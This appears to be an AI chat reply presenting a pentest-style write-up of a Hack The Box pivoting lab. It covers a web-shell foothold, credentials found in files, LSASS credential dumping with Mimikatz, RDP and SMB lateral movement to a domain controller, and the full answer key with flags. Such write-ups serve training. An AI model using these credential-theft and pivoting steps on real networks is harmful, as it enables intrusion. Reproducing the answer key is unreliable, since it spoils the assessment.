Absolutely bro. Here's a **full professional-style penetration-testing report** for the entire HTB Skills Assessment, documenting the attack chain, findings, credentials, pivoting, evidence, and flags.

# Inlanefreight Skills Assessment — Full Penetration Test Report

## 1. Executive Summary

The assessment began with access to an externally reachable Inlanefreight web server through a previously deployed **p0wny web shell**. Enumeration of the compromised Linux host revealed a `webadmin` user directory containing an SSH private key and a note containing credentials for the internal network.

The discovered credentials were used to identify and access an internal Windows pivot host. Network enumeration revealed that the pivot host was dual-homed, providing access to an additional internal network.

Further enumeration identified a Windows workstation accessible through **RDP**. A service-account misconfiguration was identified on the pivot server where the `DHCPServer` service was running under the domain account `vfrank`. LSASS credential material exposed the plaintext password associated with this service account.

The recovered credentials enabled RDP access to the next workstation. That workstation was also dual-homed and provided access to the `172.16.10.0/16` network. Enumeration identified `172.16.10.5` as the Domain Controller based on its Kerberos, LDAP, SMB, DNS, LDAPS, and Global Catalog services.

Finally, authenticated SMB access to the Domain Controller was obtained using the recovered domain credentials, allowing retrieval of the final flag.

### Overall Attack Chain

```text
External Kali
      │
      ▼
Web Shell / Linux Foothold
10.129.x.x
      │
      │ Credential discovery
      ▼
webadmin
      │
      │ mlefay credentials
      ▼
Internal Pivot
172.16.5.35
      │
      │ RDP
      ▼
Workstation
172.16.6.25
      │
      │ LSASS credential discovery
      ▼
vfrank credentials
      │
      │ RDP / SMB
      ▼
Domain Controller
172.16.10.5
      │
      ▼
C:\Flag.txt
```

---

# 2. Assessment Objectives

The assessment required the tester to:

1. Access the initial system through the provided web shell.
    
2. Enumerate the compromised host for credentials.
    
3. Identify and pivot to an internal host.
    
4. Retrieve the flag from the first internal Windows host.
    
5. Identify a vulnerable service account.
    
6. Use the exposed credentials to pivot to another workstation.
    
7. Pivot into the Domain Controller network.
    
8. Retrieve the Domain Controller flag.
    

---

# 3. Initial Foothold

## 3.1 Web Shell Access

The initial system exposed a web service hosting a **p0wny web shell**.

The shell was running under:

```text
www-data
```

Initial identity verification:

```bash
whoami
```

Result:

```text
www-data
```

The Linux filesystem was then enumerated for user directories.

---

# 4. Credential Discovery

## 4.1 User Enumeration

The `/home` directory contained:

```text
administrator
webadmin
```

The `webadmin` directory was investigated:

```bash
cd /home/webadmin
ls -lha
```

Relevant files included:

```text
for-admin-eyes-only
id_rsa
.ssh/
```

The permissions on `id_rsa` allowed it to be read by the compromised account.

---

## 4.2 Credential Disclosure

The file:

```text
/home/webadmin/for-admin-eyes-only
```

contained the following information:

```text
in order to reach server01 or other servers in the subnet from here
you have to us the user account:mlefay
with a password of :
Plain Human work!
```

Therefore, the following credential pair was identified:

```text
Username: mlefay
Password: Plain Human work!
```

### Q1 Answer

```text
webadmin
```

### Q2 Answer

```text
mlefay:Plain Human work!
```

---

# 5. Internal Network Enumeration

The compromised Linux host had two relevant network interfaces.

```text
10.129.82.44
172.16.5.15
```

The second interface provided access to the internal network.

The internal network was therefore identified as:

```text
172.16.0.0/16
```

Because Nmap was unavailable on the web shell and ICMP discovery was unsuccessful, Meterpreter's `ping_sweep` functionality was used from the compromised host.

The sweep identified:

```text
172.16.5.15
172.16.5.35
```

`172.16.5.15` was the existing foothold, while:

```text
172.16.5.35
```

was a new active internal host.

### Q3 Answer

```text
172.16.5.35
```

---

# 6. Pivot to PIVOT-SRV01

The internal host was identified as:

```text
PIVOT-SRV01
172.16.5.35
```

RDP was identified as an accessible remote-access service.

The discovered credentials were used to establish an RDP connection through the existing SOCKS/RDP pivoting infrastructure.

The connection successfully reached:

```text
172.16.5.35:3389
```

---

# 7. First Internal Flag

After obtaining access to the first Windows pivot host, the flag was retrieved from:

```text
C:\Flag.txt
```

### Q4 Answer

```text
S1ngl3-Piv07-3@y-Day
```

---

# 8. Service Account Misconfiguration

## 8.1 Service Enumeration

Windows services were enumerated using:

```cmd
wmic service get Name,StartName,State
```

A particularly significant result was:

```text
DHCPServer    INLANEFREIGHT\vfrank    Running
```

This demonstrated that the DHCP Server service was running under the domain account:

```text
INLANEFREIGHT\vfrank
```

The uploaded service enumeration confirms the `DHCPServer` service is running under `INLANEFREIGHT\vfrank`.

The service configuration was subsequently verified through PowerShell:

```powershell
Get-CimInstance Win32_Service -Filter "Name='DHCPServer'" | Format-List *
```

Relevant information:

```text
Name      : DHCPServer
State     : Running
StartMode : Auto
StartName : INLANEFREIGHT\vfrank
ProcessId : 3760
```

---

# 9. LSASS Credential Exposure

The assessment hint indicated that credentials may be stored in LSASS.

The current Windows context was checked:

```cmd
whoami /priv
```

The following privilege was available:

```text
SeImpersonatePrivilege Enabled
```

Mimikatz was then used to inspect LSASS credential material.

The LSASS output identified:

```text
Username : vfrank
Domain   : INLANEFREIGHT
NTLM     : 2e16a00be74fa0bf862b4256d0347e83
```

The Kerberos credential material also exposed the plaintext password:

```text
Username : vfrank
Domain   : INLANEFREIGHT.LOCAL
Password : Imply wet Unmasked!
```

This eliminated the need to crack the NTLM hash.

The NTLM hash was nevertheless tested against `rockyou.txt` using both Hashcat and John the Ripper. Neither recovered the password, confirming that the plaintext credential was obtained more effectively through the LSASS/Kerberos credential material.

### Q5 Answer

```text
vfrank
```

### Recovered Credential

```text
Username: INLANEFREIGHT\vfrank
Password: Imply wet Unmasked!
```

---

# 10. Enumeration of the Next Network

The pivot server was found to be dual-homed.

`ipconfig /all` revealed:

```text
Ethernet0:
172.16.5.35

Ethernet1:
172.16.6.35
```

The second interface provided access to:

```text
172.16.6.0/16
```

The route table confirmed the additional internal network interface.

---

# 11. Discovery of the Q6 Workstation

TCP-based discovery was performed from the Windows pivot.

RDP enumeration identified:

```text
172.16.6.25:3389
```

The other result:

```text
172.16.6.35:3389
```

was the pivot host itself.

Therefore the next workstation was:

```text
172.16.6.25
```

Connectivity was verified using:

```powershell
Test-NetConnection 172.16.6.25 -Port 3389
```

Result:

```text
SourceAddress     : 172.16.6.35
RemoteAddress     : 172.16.6.25
RemotePort        : 3389
TcpTestSucceeded  : True
```

---

# 12. RDP Pivot to Workstation

The recovered domain credentials were used for RDP authentication:

```text
Domain:   INLANEFREIGHT
Username: vfrank
Password: Imply wet Unmasked!
```

The connection was successfully established to:

```text
172.16.6.25
```

The workstation's flag was retrieved from:

```text
C:\Flag.txt
```

### Q6 Answer

```text
N3tw0rk-H0pp1ng-f0R-FuN
```

---

# 13. Enumeration of the Third Network

Once on `172.16.6.25`, network configuration was enumerated.

The workstation had two interfaces:

```text
Ethernet0:
172.16.6.25

Ethernet1:
172.16.10.25
```

The second interface exposed another internal network:

```text
172.16.10.0/16
```

This represented the final internal network containing the Domain Controller.

---

# 14. Domain Controller Discovery

The DNS server configured on the workstation was:

```text
172.16.10.5
```

The host was tested for common Domain Controller services.

The following ports were confirmed accessible:

|Port|Service|Result|
|--:|---|---|
|53|DNS|Open|
|88|Kerberos|Open|
|389|LDAP|Open|
|445|SMB|Open|
|636|LDAPS|Open|
|3268|Global Catalog|Open|

Testing was performed using:

```powershell
88,389,445,53,636,3268 | % { Write-Host $_ (Test-NetConnection 172.16.10.5 -Port $_ -InformationLevel Quiet -WarningAction SilentlyContinue) }
```

Result:

```text
88   True
389  True
445  True
53   True
636  True
3268 True
```

The combination of Kerberos, LDAP, SMB, DNS, LDAPS, and Global Catalog services strongly identified:

```text
172.16.10.5
```

as the Domain Controller.

---

# 15. Authenticated Access to Domain Controller

SMB connectivity was first verified:

```powershell
Test-NetConnection 172.16.10.5 -Port 445
```

Result:

```text
TcpTestSucceeded : True
```

Authenticated SMB access was then established using:

```cmd
net use \\172.16.10.5\IPC$ /user:INLANEFREIGHT\vfrank
```

The command returned:

```text
The command completed successfully.
```

This confirmed that the recovered `vfrank` domain credentials were valid against the Domain Controller.

Administrative share access was subsequently used to retrieve:

```text
C:\Flag.txt
```

---

# 16. Final Flag

The Domain Controller flag was:

```text
3nd-0xf-Th3-R@inbow!
```

### Q7 Answer

```text
3nd-0xf-Th3-R@inbow!
```

---

# 17. Complete Answers

|Question|Answer|
|---|---|
|**Q1**|`webadmin`|
|**Q2**|`mlefay:Plain Human work!`|
|**Q3**|`172.16.5.35`|
|**Q4**|`S1ngl3-Piv07-3@y-Day`|
|**Q5**|`vfrank`|
|**Q6**|`N3tw0rk-H0pp1ng-f0R-FuN`|
|**Q7**|`3nd-0xf-Th3-R@inbow!`|

---

# 18. Attack Path Summary

```text
                    EXTERNAL NETWORK
                           │
                           ▼
                 Linux Web Server
                 10.129.82.44
                           │
                           │ Web Shell
                           ▼
                       www-data
                           │
                           │
                  /home/webadmin
                           │
             ┌─────────────┴─────────────┐
             │                           │
       webadmin files              mlefay credentials
             │                           │
             └─────────────┬─────────────┘
                           ▼
                    172.16.5.15
                           │
                           │ Internal Enumeration
                           ▼
                    172.16.5.35
                    PIVOT-SRV01
                           │
                           │ RDP
                           ▼
                    172.16.6.25
                    WORKSTATION
                           │
                           │ Dual-homed
                           ▼
                    172.16.10.25
                           │
                           │ DC Enumeration
                           ▼
                    172.16.10.5
                 DOMAIN CONTROLLER
                           │
                           ▼
                       C:\Flag.txt
```

---

# 19. Key Findings

## Finding 1 — Web Shell Exposure

A web shell was available on the externally accessible web server, providing command execution as:

```text
www-data
```

**Impact:** Initial unauthorized command execution and access to the internal network configuration.

---

## Finding 2 — Sensitive Credentials Stored in User Directory

The `webadmin` home directory contained a file explicitly exposing credentials for internal systems:

```text
mlefay:Plain Human work!
```

**Impact:** An attacker obtaining web-shell access could recover credentials usable for internal network pivoting.

---

## Finding 3 — Service Running Under Domain User Account

The `DHCPServer` service was configured to run as:

```text
INLANEFREIGHT\vfrank
```

The service enumeration directly confirms this configuration.

**Impact:** A privileged service context associated with a domain account exposed reusable domain credentials.

---

## Finding 4 — Credentials Exposed in LSASS

LSASS contained credential material for:

```text
INLANEFREIGHT\vfrank
```

including the NTLM hash and plaintext Kerberos password.

**Impact:** Credential theft enabled lateral movement to additional internal systems without password guessing.

---

## Finding 5 — Multiple Dual-Homed Pivot Hosts

The environment intentionally contained hosts with interfaces on multiple internal networks:

```text
172.16.5.35
172.16.6.35
```

and:

```text
172.16.6.25
172.16.10.25
```

**Impact:** Compromise of one host could be leveraged to access otherwise unreachable network segments.

---

# 20. Recommendations

### 1. Remove Web Shells

Immediately investigate and remove unauthorized web shells and determine how the shell was initially deployed.

Implement:

- File-integrity monitoring
    
- Web application security testing
    
- Least-privilege web service accounts
    
- Web-server access logging
    
- Detection for web shells
    

### 2. Do Not Use Domain Accounts for Services When Unnecessary

The `DHCPServer` service should not unnecessarily operate under a reusable domain user account.

Where possible, use:

- Group Managed Service Accounts (gMSA)
    
- Dedicated service identities
    
- Least-privileged service accounts
    

### 3. Protect LSASS

Implement protections such as:

- Credential Guard where supported
    
- LSASS protection/PPL
    
- Modern Windows security baselines
    
- Endpoint detection for credential-dumping behavior
    
- Restrict administrative privileges
    

### 4. Apply Least Privilege

The `vfrank` account should have only the permissions required for its service function.

Service accounts should not have unnecessary interactive logon, RDP, or administrative privileges.

### 5. Segment Internal Networks

The assessment demonstrated that dual-homed systems enabled sequential network traversal.

Network segmentation should restrict unnecessary communication between:

```text
172.16.5.0/16
172.16.6.0/16
172.16.10.0/16
```

### 6. Restrict RDP

RDP should be limited through:

- Firewall ACLs
    
- Jump hosts
    
- Network-level authentication
    
- MFA where applicable
    
- Restricted administrative groups
    

### 7. Monitor Credential Theft

Security monitoring should detect:

- LSASS access
    
- Credential dumping tools
    
- Abnormal service-account logons
    
- Lateral RDP activity
    
- SMB administrative-share access
    
- Authentication from unusual network segments
    

---

# 21. Final Assessment Conclusion

The assessment demonstrated a complete multi-stage compromise of the Inlanefreight environment.

The attacker began with a web-shell foothold and leveraged **credential discovery, internal network enumeration, RDP pivoting, service-account enumeration, LSASS credential exposure, dual-homed systems, and SMB authentication** to progress through multiple network segments.

The final Domain Controller was reached through the chain:

```text
Web Server
    ↓
172.16.5.15
    ↓
PIVOT-SRV01 / 172.16.5.35
    ↓
172.16.6.25
    ↓
172.16.10.5
    ↓
Domain Controller
```

The successful compromise demonstrates that **credential exposure combined with insufficient network segmentation and excessive trust between internal systems can allow an attacker to move from an externally accessible web server to the Domain Controller.**

**Assessment result: COMPLETE — all seven objectives successfully achieved.**